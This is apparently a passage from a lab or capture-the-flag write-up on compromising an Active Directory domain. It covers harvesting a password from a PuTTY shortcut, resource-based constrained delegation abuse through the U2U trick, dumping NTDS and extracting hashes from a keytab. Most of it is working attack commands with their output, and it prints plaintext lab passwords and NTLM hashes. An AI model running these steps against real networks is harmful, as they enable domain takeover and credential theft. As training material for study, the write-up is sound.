    Get file Is there a way to -auto login- in PuTTY with a password- - Super User.url? y
    getting file \Julian.Pratt\Is there a way to -auto login- in PuTTY with a password- - Super User.url of size 117 as Is there a way to -auto login- in PuTTY with a password- - Super User.url (0.0 KiloBytes/sec) (average 0.4 KiloBytes/sec)
    Get file Microsoft Edge.lnk? y
    getting file \Julian.Pratt\Microsoft Edge.lnk of size 2312 as Microsoft Edge.lnk (8.9 KiloBytes/sec) (average 0.8 KiloBytes/sec)
    Get file mucjmp.lnk? y
    getting file \Julian.Pratt\mucjmp.lnk of size 1441 as mucjmp.lnk (5.2 KiloBytes/sec) (average 1.1 KiloBytes/sec)


### bloodhound

    ➜  bloodhound proxychains bloodhound-python -c ALL -u 'julian.pratt' -p 'Deplete5DenialDealt' -d heron.vl -ns 10.10.163.85

### creds

    ➜  accounting cat mucjmp.lnk 
    2t▒`��ف+B�� �gP�O� �:i�+00�/C:\�1�X�sPROGRA~1t  ﾨR�B�X�s.BJz
    AProgram Files@shell32.dll,-21781▒P1�X�[PuTTY<  ﾺX�[�X�[.���PuTTY\2 ��X�� putty.exeD    ﾆX���X�[.putty.exe▒O-N�h�ZC:\Program Files\PuTTY\putty.exe#..\..\Program Files\PuTTY\putty.exeC:\Program Files\PuTTY$adm_prju@mucjmp -pw <redacted>

so before bloodhound our target is adm_prju

    ➜  accounting proxychains nxc smb MUCDC -u adm_prju -p 'ayDMWV929N9wAiB4'                                       
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:445  ...  OK
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:135  ...  OK
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:445  ...  OK
    SMB         224.0.0.1       445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)
    SMB         224.0.0.1       445    MUCDC            [+] heron.vl\adm_prju:ayDMWV929N9wAiB4 

## WriteAccountRestricitons

![alt text](<../assets/images/2 (5).png>)

### RBCD FAILED

computer-counter

    ➜  images proxychains nxc ldap MUCDC -u adm_prju -p 'ayDMWV929N9wAiB4' -M maq
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:445  ...  OK
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:389  ...  OK
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:135  ...  OK
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:445  ...  OK
    SMB         224.0.0.1       445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:389  ...  OK
    LDAP        224.0.0.1       389    MUCDC            [+] heron.vl\adm_prju:ayDMWV929N9wAiB4 
    MAQ         224.0.0.1       389    MUCDC            [*] Getting the MachineAccountQuota
    MAQ         224.0.0.1       389    MUCDC            MachineAccountQuota: 0

its imposibble to do with 0 machine so lets add it.

    ➜  images proxychains impacket-rbcd -delegate-from 'adm_prju' -delegate-to 'mucdc$' -dc-ip 10.10.163.85 -action 'write' 'heron.vl/adm_prju:ayDMWV929N9wAiB4'
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] DLL init: proxychains-ng 4.17
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.163.85:389  ...  OK
    [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
    [*] Delegation rights modified successfully!
    [*] adm_prju can now impersonate users on mucdc$ via S4U2Proxy
    [*] Accounts allowed to act on behalf of other identity:
    [*]     adm_prju     (S-1-5-21-1568358163-2901064146-3316491674-24596)

check

    ➜  images proxychains impacket-rbcd -delegate-to 'mucdc$' -dc-ip 10.10.163.85 -action 'read' 'heron.vl/adm_prju:ayDMWV929N9wAiB4'
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] DLL init: proxychains-ng 4.17
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.163.85:389  ...  OK
    [*] Accounts allowed to act on behalf of other identity:
    [*]     adm_prju     (S-1-5-21-1568358163-2901064146-3316491674-24596)

failed

    ➜  images proxychains impacket-getST -dc-ip 10.10.163.85 -spn cifs/mucdc.heron.vl 'heron.vl/adm_prju:ayDMWV929N9wAiB4' -impersonate _admin
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] DLL init: proxychains-ng 4.17
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [-] CCache file is not found. Skipping...
    [*] Getting TGT for user
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.163.85:88  ...  OK
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.163.85:88  ...  OK
    [*] Impersonating _admin
    /usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    now = datetime.datetime.utcnow()
    /usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
    [*] Requesting S4U2self
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.163.85:88  ...  OK
    [-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
    [-] Probably user adm_prju does not have constrained delegation permisions or impersonated user does not exist

its not work for sure so what we have to do;

### RBCD WORKED

extract ticket

    ➜  images proxychains impacket-getTGT -hashes :$(pypykatz crypto nt 'ayDMWV929N9wAiB4') 'heron.vl/adm_prju'
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] DLL init: proxychains-ng 4.17
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  HERON.VL:88  ...  OK
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  HERON.VL:88  ...  OK
    [*] Saving ticket in adm_prju.ccache

grab key

    ➜  images impacket-describeTicket 'adm_prju.ccache' | grep 'Ticket Session Key'
    [*] Ticket Session Key            : 20d847c00fff97709c92195de8f48e2b

change passwd


    ➜  images proxychains python3 smbpasswd.py -newhashes :20d847c00fff97709c92195de8f48e2b 'heron.vl'/'adm_prju':'ayDMWV929N9wAiB4'@'heron.vl'
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.163.85:445  ...  OK
    [*] NTLM hashes were changed successfully.

grab admin ccache

    ➜  images export KRB5CCNAME=adm_prju.ccache 
    ➜  images proxychains impacket-getST -u2u -impersonate "_admin" -spn "cifs/mucdc.heron.vl" -k -no-pass 'heron.vl'/'adm_prju' 
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] DLL init: proxychains-ng 4.17
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [*] Impersonating _admin
    /usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    now = datetime.datetime.utcnow()
    /usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
    [*] Requesting S4U2self+U2U
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.163.85:88  ...  OK
    /usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    now = datetime.datetime.utcnow()
    /usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
    [*] Requesting S4U2Proxy
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.163.85:88  ...  OK
    [*] Saving ticket in _admin@cifs_mucdc.heron.vl@HERON.VL.ccache

_admin hash


    ➜  images export KRB5CCNAME=_admin@cifs_mucdc.heron.vl@HERON.VL.ccache 
    ➜  images proxychains nxc smb MUCDC --use-kcache --ntds
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    [!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y 
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:445  ...  OK
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:135  ...  OK
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:445  ...  OK
    SMB         MUCDC           445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)
    SMB         MUCDC           445    MUCDC            [+] heron.vl\_admin from ccache (Pwn3d!)
    SMB         MUCDC           445    MUCDC            [+] Dumping the NTDS, this could take a while so go grab a redbull...
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:135  ...  OK
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:49667  ...  OK
    SMB         MUCDC           445    MUCDC            _admin:500:aad3b435b51404eeaad3b435b51404ee:3998cdd28f164fa95983caf1ec603938:::  

### RBCD BONUS
we are getting keytab file from frajmp root 


    ➜  KeyTabExtract git:(master) ✗ python3 keytabextract.py a
    [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
    [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
    [*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
    [+] Keytab File successfully imported.
            REALM : HERON.VL
            SERVICE PRINCIPAL : FRAJMP$/
            NTLM HASH : 6f55b3b443ef192c804b2ae98e8254f7
            AES-256 HASH : 7be44e62e24ba5f4a5024c185ade0cd3056b600bb9c69f11da3050dd586130e7
            AES-128 HASH : dcaaea0cdc4475eee9bf78e6a6cbd0cd

commands

    # create
    ➜  images proxychains impacket-rbcd -delegate-from 'frajmp$' -delegate-to 'mucdc$' -dc-ip 10.10.163.85 -action 'write' 'heron.vl/adm_prju:ayDMWV929N9wAiB4'


    # check
    ➜  images proxychains impacket-rbcd -delegate-to 'mucdc$' -dc-ip 10.10.163.85 -action 'read' 'heron.vl/adm_prju:REDACTED'

    # get ticket
    ➜  images proxychains impacket-getST -dc-ip 10.10.163.85 -spn cifs/mucdc.heron.vl 'heron.vl/frajmp$' -impersonate _admin -hashes :6f[...]4f7

    # export ticket and get hashes
    ➜  images proxychains nxc smb 10.10.163.85--use-kcache --ntds

